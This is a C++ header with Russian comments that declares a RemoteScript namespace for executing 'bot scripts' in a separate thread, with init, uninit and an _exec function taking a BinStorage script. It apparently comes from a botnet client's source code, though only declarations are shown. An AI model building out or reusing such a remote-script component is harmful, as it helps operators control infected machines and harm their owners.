/*
  Исполнение скриптов бота.
*/
#pragma once

#include "..\common\binstorage.h"

namespace RemoteScript
{
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Запуск исполнения скрипта вотделном потоке. Пото не должен запускаться из
    Process::INTEGRITY_LOW процессов.

    IN script - скрипт для исполнения. 
    
    Return    - true - в случаи успешного запуска исполенния скрипта (script будет освобожден
                автоматически),
                false - в случаи ошибки (script нужно освободить самостоятельно).
  */
  bool _exec(BinStorage::STORAGE *script);
};
